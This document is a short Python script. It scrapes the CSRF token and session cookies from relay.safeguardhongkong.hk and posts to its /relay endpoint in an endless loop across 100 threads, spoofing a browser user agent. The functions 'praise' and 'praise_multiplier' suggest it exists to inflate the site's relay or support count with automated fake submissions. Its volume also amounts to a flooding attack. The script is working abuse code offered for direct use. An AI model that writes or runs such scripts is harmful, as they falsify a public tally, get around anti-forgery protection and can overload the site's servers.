import requests
import re
import json
import threading

HOME_URL = "https://relay.safeguardhongkong.hk"
RELAY_URL = "https://relay.safeguardhongkong.hk/relay"
USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'
ACCEPT = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'

def praise():
    session = requests.Session()
    while True:
        response = session.get(HOME_URL)

        x_csrf_token = re.search("\'X-CSRF-TOKEN\': \'(.*)?\'", response.text).group(1)

        cookie = response.headers['Set-Cookie']

        xsrf_token = re.search('XSRF-TOKEN=\w*', cookie).group(0)
        laravel_session = re.search('laravel_session=\w*', cookie).group(0)

        request_headers = {}
        request_headers['X-CSRF-TOKEN'] = x_csrf_token
        request_headers['user-agent'] = USER_AGENT
        request_headers['accept'] = ACCEPT
        request_headers['cookie'] = "{}; {}".format(xsrf_token, laravel_session)

        response = session.post(RELAY_URL, headers=request_headers)
        status = json.loads(response.text)['status']
        if status != "200":
            session.close()
            break

def praise_multiplier(thread_count=100):
    threads = [threading.Thread(target=praise) for x in range(thread_count)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    print("Finished praising")

if __name__ == "__main__":
    praise_multiplier()
